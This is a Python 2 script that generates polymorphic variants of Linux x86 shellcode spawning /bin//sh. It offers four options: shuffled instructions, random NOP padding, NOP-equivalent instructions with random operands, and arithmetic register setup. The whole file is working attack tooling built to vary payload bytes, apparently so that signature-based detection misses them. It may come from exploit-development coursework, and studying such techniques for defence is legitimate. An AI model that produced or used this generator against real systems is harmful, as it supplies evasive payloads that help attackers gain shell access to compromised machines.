#!/usr/bin/env python

from random import randint, shuffle;
import sys, getopt;
import socket;

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-s, --shuffle: use SHUFFLE strategy on operands"
    print "\t-n, --nop: add a random number of NOPs to the shellcode"
    print "\t-N, --nop-equivalent: add some NOP equivalent instruction to the code"
    print "\t-m, --math: use math strategy for MOV"
    return 0

def exec_shuffle():
    init_blk =["\\x6a\\x0b", "\\x31\\xc9", "\\x31\\xd2"];
    shuffle(init_blk);

    return "".join(init_blk)+"\\x58\\xeb\\x03\\x5b\\xcd\\x80\\xe8\\xf8\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68";

def byte_len(array_string):
    return "".join(array_string).count("\\x")

def exec_nop_dope():
    init_blk =["\\x6a\\x0b\\x58", "\\x31\\xc9", "\\x31\\xd2"];
    setup_blk=["\\x5b" ];

    n = randint(0, 10); 
    init_nop_blk = ["\\x90"]*(n/3)
    setup_nop_blk = ["\\x90"]*(n*2/3)

    init_blk.extend(init_nop_blk)
    setup_blk.extend(setup_nop_blk)

    shuffle(init_blk);
    shuffle(setup_blk);

    # The first JMP address is our setup_blk array lenght + 2
    # The second CALL address is FF - our setup_blk array lenght - 6
    jmp_adj = byte_len(setup_blk) + 2
    call_adj = format((255 - byte_len(setup_blk) - 6), 'x')

    return "".join(init_blk)+"\\xeb\\x0"+str(jmp_adj)+"".join(setup_blk)+"\\xcd\\x80\\xe8\\x"+str(call_adj)+"\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68";

def kill_nop_super_dope():

    init_blk =["\\x6a\\x0b\\x58", "\\x31\\xc9", "\\x31\\xd2"];
    setup_blk=["\\x5b" ];

    nop_blk=["\\x90", "\\x83\\xf8\\x$$", "\\x83\\xfb\\x??", "\\x83\\xf9\\x%%", "\\x87\\xdb", "\\x87\\xc9"]

    shuffle(nop_blk)
    n = randint(0, 10); 
    init_nop_blk = nop_blk[0:(n/3)]
    shuffle(nop_blk)
    setup_nop_blk = nop_blk[0:(n*2/3)]


    init_blk.extend(init_nop_blk)

    setup_blk.extend(setup_nop_blk)

    shuffle(init_blk);
    shuffle(setup_blk);

    jmp_adj = format(byte_len(setup_blk) + 2, '02x')
    call_adj = format((255 - byte_len(setup_blk) - 6), 'x')

    tmp= "".join(init_blk)+"\\xeb\\x"+str(jmp_adj)+"".join(setup_blk)+"\\xcd\\x80\\xe8\\x"+str(call_adj)+"\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68";

    par = randint(1,255);
    shellcode=tmp.replace("$$", str(format(par, 'x')));
    par = randint(1,255);
    shellcode=shellcode.replace("??", str(format(par, 'x')));
    par = randint(1,255);
    shellcode=shellcode.replace("%%", str(format(par, 'x')));
    return shellcode

def exec_sub_strategy():

    # EAX = 0xb

    init_eax = ["\\x29\\xc0\\xb0\\x??\\x2c\\x$$"];
    par = randint(1, 255)
    eax = "".join(init_eax)
    eax = eax.replace("??", str(format(par, 'x')))
    eax = eax.replace("$$", str(format(par-11, 'x')))

    init_ecx = ["\\x31\\xc9", "\\xc4\\xe2\\x70\\xf2\\xc9", "\\x6a\\x??\\x59\\x80\\xe9\\x??"]
    shuffle(init_ecx)
    par = randint(1, 127)
    ecx = "".join(init_ecx[0])
    ecx = ecx.replace("??", str(format(par, 'x')))

    init_edx = ["\\x31\\xd2", "\\xc4\\xe2\\x68\\xf2\\xd2", "\\x6a\\x??\\x5a\\x80\\xea\\x??"]
    shuffle(init_edx)
    par = randint(1, 127)
    edx = "".join(init_edx[0])
    edx = edx.replace("??", str(format(par, 'x')))

    init_blk = [eax, ecx, edx]
    shuffle(init_blk);
    return "".join(init_blk)+"\\xeb\\x03\\x5b\\xcd\\x80\\xe8\\xf8\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68";


def main(argv):
    shellcode="";

    try:
        opts, args=getopt.getopt(argv, "hsnNm", ["help", "shuffle", "nop", "nop-equivalent", "math"])
    except getopt.GetoptError:
        help()
        sys.exit(1)
    
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-s', '--shuffle'):
            shellcode=exec_shuffle()
        elif opt in ('-n', '--nop'):
            shellcode=exec_nop_dope()
        elif opt in ('-N', '--nop-equivalent'):
            shellcode=kill_nop_super_dope()
        elif opt in ('-m', '--math'):
            shellcode=exec_sub_strategy()

    print "Shellcode: ", shellcode
    print "Length: ", len(shellcode)/4

if __name__ == "__main__":
    main(sys.argv[1:])

